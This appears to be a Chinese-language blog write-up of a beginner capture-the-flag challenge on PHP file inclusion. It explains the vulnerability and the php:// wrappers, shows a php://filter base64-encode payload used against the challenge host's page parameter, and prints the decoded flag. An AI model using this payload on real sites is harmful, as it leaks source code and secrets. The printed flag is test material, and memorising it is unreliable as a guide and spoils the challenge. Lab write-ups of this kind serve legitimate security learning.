---
layout:     post
title:      FileInclude 
subtitle:   
date:       2020-03-15
author:     SGQ
header-img: img/post-bg-coffee.jpeg
catalog: true
tags:
    - FileInclude 
    - Web
---

## 简介:

   程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，
而无需再次编写，这中文件调用的过程一般被称为文件包含。

   程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，
但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。





## 题目:

``` html
<body> 

    <div class="navbar navbar-inverse navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container">
          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </a>
          <a class="brand" href="http://blue-whale.me/">blue-whale.me</a>
          <div class="nav-collapse collapse">
            <ul class="nav">
              <li class="active"><a href="./?page=home">Home</a></li>
              <li class="active"><a href="./?page=flag">Flag</a></li>
            </ul>
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>

    <div class="container">



ha ha? you want flag? flag is here, but don't let you see!

      <footer>
        <p>&copy; Blue-Whale 2017</p>
      </footer>

    </div> <!-- /container -->


  </body>

```

## 考察点：

**1.文件包含的基本原理**

**2.文件包含如何构造payload**


## 知识点：


**1.原理:**

PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。最常见的就属于本地文件包含（Local File Inclusion）漏洞了。

程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。

**2.文件包含漏洞分为：**

(1).本地文件包含漏洞

顾名思义，就是在网站服务器本身存在恶意文件，然后利用本地文件包含使用

(2).远程文件包含漏洞

远程文件包含就是调用其他网站的恶意文件进行打开


**3.php常见的几个文件包含函数：**
`include()`,   `include_once()`,  `fopen()`, `require()`,  `require_once()`

**4.php伪协议的分类**

>`php://input`

php://input代表可以访问请求的原始数据，简单来说POST请求的情况下，php://input可以获取到post的数据。

使用条件：`include( )`、`include_once( )`、`file_get_contents( )`

比较特殊的一点，enctype=”multipart/form-data”的时候 php://input 是无效的。

>`php://output`

php://output 是一个只写的数据流，允许你以print和echo一样的方式写入到输出缓冲区。

>`php://filter`

php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用，也就是作为一种过滤器，可以使用在数据流产生的地方。

类似的过滤器还有`string.rot13`、`string.strip_tags`、`zlib.deflate`和`zlib.inflate`等等，目前只要知道`convert.base64-encode`就可以。

**5.URL 中包含点的常见形式:**

`?file = xxx `或者 `?file = xxx.php`



## 解题过程：

**1.** 首先分析页面代码，发现 `<li class="active"><a href="./?page=home">Home</a></li>`,
              `<li class="active"><a href="./?page=flag">Flag</a></li>`  ，可能出现文件包含漏洞.




**2.** 然后开始构造payload，分析页面发现，`http://vps1.blue-whale.me:23338/?page=flag` ,这里是靠page参数进行跳转页面，
于是构造payload : `?page=php://filter/read/resource=./flag `  ,此段代码的含义可理解为筛选`page=flag`的页面并读取。但是页面并没有反应，于是我猜想可能是因为过滤了`read`这个关键词（一般会对一些伪协议的关键词进行过滤，如`read`、`resource`等等）。

**3.** 试一下将read这个关键词进行BASE64加密，新的payload：

`?page=php://filter/read=convert.base64-encode/resource=./flag`

**4.** 得到一组BASE64加密的字符串

`aGEgaGE/IHlvdSB3YW50IGZsYWc/IGZsYWcgaXMgaGVyZTw/cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdX
JjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9J
zsNCj8+LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo=`

**5.** 进行解密，得到flag！
``` php
ha ha? you want flag? flag is here
<?php
// try to read this source code
//$flag = 'flag{really_basic_skill_web_dog_should_know}';
?>, but don't let you see!   

```


**flag{really_basic_skill_web_dog_should_know}**





[参考链接（一）--文件包含原理](https://blog.csdn.net/qq_42133828/article/details/83927058)

[参考链接（二）--文件包含的技巧](https://www.cnblogs.com/ichunqiu/p/10683379.html)

## 谢谢您的查阅，欢迎来访！
